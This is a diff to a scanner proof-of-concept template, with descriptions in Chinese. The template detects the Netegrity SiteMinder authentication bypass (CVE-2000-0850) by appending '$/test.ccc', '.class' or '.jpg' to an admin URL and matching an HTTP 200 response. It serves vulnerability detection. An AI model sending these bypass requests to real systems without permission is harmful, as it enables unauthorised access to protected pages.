@@ -1,10 +1,10 @@
 [info]
-author = "AVE"
-description = "检测 Netegrity SiteMinder 4.11 之前版本是否存在认证绕过漏洞，通过向受保护的 URL 后附加 $/FILENAME.ext 尝试绕过身份验证"
+author = "ave"
+description = "Netegrity SiteMinder 4.11 之前版本存在认证绕过漏洞。远程攻击者通过在受保护资源的 URL 后附加 $/FILENAME.ext（如 .ccc、.class 或 .jpg）即可绕过身份认证，直接访问本应受保护的页面。该漏洞源于 SiteMinder 对 URL 中特殊模式的处理缺陷，攻击者无需任何凭证即可利用。"
 id = "POC-AVE-2000-0971"
-name = "Netegrity SiteMinder 认证绕过漏洞 PoC"
+name = "Netegrity SiteMinder 认证绕过 PoC"
 severity = "high"
-tags = ["cve-2000-0850"]
+tags = ["ave-2000-0971"]
 vuln_id = [
     "CVE-2000-0850",
     "AVE-2000-0971",
@@ -15,48 +15,30 @@ logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/admin/$.ccc"
+path = "/{{BaseURL}}/admin/console$/test.ccc"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "200",
-    "Welcome",
-    "Admin",
-    "Dashboard",
-]
+status = [200]
+type = "status"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/protected/$.class"
+path = "/{{BaseURL}}/admin/console$/test.class"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "200",
-    "Welcome",
-    "Admin",
-    "Dashboard",
-]
+status = [200]
+type = "status"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/secure/$.jpg"
+path = "/{{BaseURL}}/admin/console$/test.jpg"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "200",
-    "Welcome",
-    "Admin",
-    "Dashboard",
-]
+status = [200]
+type = "status"
